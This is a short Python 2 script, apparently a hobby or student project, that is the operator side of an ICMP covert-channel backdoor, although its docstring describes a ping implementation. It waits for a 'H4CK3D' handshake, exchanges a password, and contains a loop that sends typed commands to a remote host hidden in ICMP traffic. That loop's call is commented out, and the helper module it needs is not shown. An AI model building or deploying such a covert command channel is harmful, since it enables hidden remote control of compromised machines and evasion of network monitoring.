#!/usr/bin/env python
# encoding: utf-8
"""
"  A pure python ping implementation using raw socket.
"  ICMP messages can only be sent from processes running as root.
"""

#   ops
# Me sinto naqueles tutorial do yt meia boca anos 2000 KKKK


# Entao pia: vou mostrar o enunciado pra vc, ai vc le ele em voz alta pra eu saber q acabou UHEUHEHU

import os, sys, socket, struct, select, time, string, argparse, IN
from ICMP_connection import ICMP


def execute_commands(icmp_helper):
    print "hello"
    timeout = 20
    while True:
        try:
            # TODO: add pwd to string
           command = raw_input("Command:")
           print command
           icmp_helper.send(command)
           print "hello2"
           data = icmp_helper.receive(timeout)
           print data
        except KeyboardInterrupt:
           break
        # except Exception as ex:
        #     template = "An exception of type {0} occurred. Arguments:\n{1!r}"
        #     message = template.format(type(ex).__name__, ex.args)
        #     print message




host = "10.0.24.8"
destination = "127.0.0.1"
icmp_helper = ICMP(host, destination)
timeout = 10
secret_handshake = "H4CK3D"
# Wait for connection from client
print "Starting program..."
print "Waiting for connection..."
while True:
    try:
        print "Expecting handshake"
        data = icmp_helper.receive(timeout)
        print ""
        print repr(data)
        try:
            if(secret_handshake in data):
                password = raw_input("Enter the password:\n")
                icmp_helper.send(password)
                print "Expecting OK"
                data = icmp_helper.receive(timeout)
                if("OK" in data):
                    print "Connected!"
                    # execute_commands(icmp_helper)
                    exit()
                else:
                    print "Connection failed, wrong password."
            else:
                print "Connection failed, retrying..."
            print "-------------------"
            time.sleep(1)
        except KeyboardInterrupt:
            break
    except KeyboardInterrupt:
        break

        # except Exception as ex:
        #     icmp_helper.clearID()
        #     template = "An exception of type {0} occurred. Arguments:\n{1!r}"
        #     message = template.format(type(ex).__name__, ex.args)
        #     print "Wrong data..."
        #     print "Retrying.."
icmp_helper.close()
